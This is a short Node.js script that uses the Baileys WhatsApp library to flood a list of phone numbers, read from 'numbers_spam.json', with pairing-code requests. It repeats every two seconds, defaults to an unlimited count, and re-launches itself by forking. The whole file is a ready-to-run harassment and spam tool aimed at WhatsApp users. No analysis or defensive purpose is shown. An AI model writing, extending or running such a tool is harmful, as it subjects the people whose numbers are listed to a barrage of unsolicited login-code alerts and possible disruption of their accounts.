const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs').promises; 
const path = require('path');
const { fork } = require('child_process');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function fetchPhoneNumbers() {
    try {
        const data = await fs.readFile('./numbers_spam.json', 'utf8');
        return Object.values(JSON.parse(data)).flat();
    } catch {
        return [];
    }
}

async function processRequests(XeonBotInc, xeonCodes) {
    const phoneNumbers = await fetchPhoneNumbers();
    const promises = phoneNumbers.slice(0, xeonCodes).map(number => 
        XeonBotInc.requestPairingCode(number).catch(() => {})
    );
    await Promise.allSettled(promises);
}

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        auth: state,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    let xeonCodes;
    const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
    const choice = await Promise.race([choicePromise, new Promise(resolve => setTimeout(() => resolve('3'), 1000))]);

    xeonCodes = choice === '1' ? 100 : choice === '2' ? 1000 : Infinity;

    const requestInterval = setInterval(() => processRequests(XeonBotInc, xeonCodes), 2000);

    setTimeout(() => {
        clearInterval(requestInterval);
        process.exit(0);
    }, 900000);
    
    return XeonBotInc;
}

XeonProject().then(() => {
    setTimeout(() => fork(path.resolve(__filename)), 1000);
});
